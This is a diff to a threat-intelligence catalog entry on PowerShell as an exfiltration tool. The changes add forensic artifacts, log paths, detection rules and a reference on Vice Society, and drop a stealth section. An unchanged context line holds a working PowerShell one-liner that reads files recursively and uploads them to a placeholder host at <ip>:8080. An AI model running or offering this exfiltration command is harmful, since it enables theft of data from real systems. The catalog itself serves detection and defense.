@@ -12,11 +12,20 @@ Capabilities:
 - base64-encoding
 - fileless-exfiltration
 - chunked-upload
-Stealth:
 - living-off-the-land
 - script-obfuscation
 - no-disk-artifacts
 Forensics:
+  FileNamePatterns:
+    - powershell.exe
+    - pwsh.exe
+    - powershell_ise.exe
+    - powershell.v2.exe
+  LogFiles:
+    - C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    - C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+    - C:\Windows\System32\winevt\Logs/Microsoft-Windows-PowerShell%4Operational.evtx
+    - /var/log/syslog  # (for Linux-based PowerShell Core)
   BinaryLocations:
   - C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
   CommandLineArgs:
@@ -35,10 +44,7 @@ Forensics:
   ConfigFiles: []
   ScheduledTask: []
   RegistryPersistence: []
-Tags:
-- stealth
-- commonly-used
-- remote-execution
+
 ThreatActors:
 - vice-society
 - unc5527
@@ -75,4 +81,26 @@ UseCases:
     -Recurse; foreach ($f in $files) { $c = [System.IO.File]::ReadAllBytes($f.FullName);
     (New-Object System.Net.WebClient).UploadData("http://<ip>:8080/upload/$($f.Name)",
     "POST", $c) }
+Detection:
+  - Type: Suspicious PowerShell Flags
+    Description: >
+      Alert on use of flags such as `-EncodedCommand`, `-NoProfile`, `-WindowStyle Hidden`, or `-Command` with suspicious expressions (e.g., base64 payloads, curl usage).
+
+  - Type: Data Staging and Exfil Scripts
+    Description: >
+      Monitor for scripts using commands like `Get-Content`, `Compress-Archive`, `ConvertTo-Base64`, or loops writing to external endpoints (HTTP, FTP, S3).
+
+  - Type: Network Activity from PowerShell
+    Description: >
+      Detect PowerShell processes making outbound HTTP/HTTPS connections or DNS queries not typical of normal administrative behavior.
+
+  - Type: Fileless Execution
+    Description: >
+      Detect PowerShell spawned from LOLBINs (e.g., `mshta.exe`, `wmic.exe`) or injected into other processes (e.g., via `reflective PE` loaders).
+
+  - Type: Unusual Parent Process
+    Description: >
+      Flag PowerShell executions from non-standard parents like `Office`, `Outlook`, or `OneNote`, as these may be signs of initial access or staged exfiltration.
+References:
+- https://unit42.paloaltonetworks.com/vice-society-ransomware-powershell/
 LastModified: '2025-10-01'
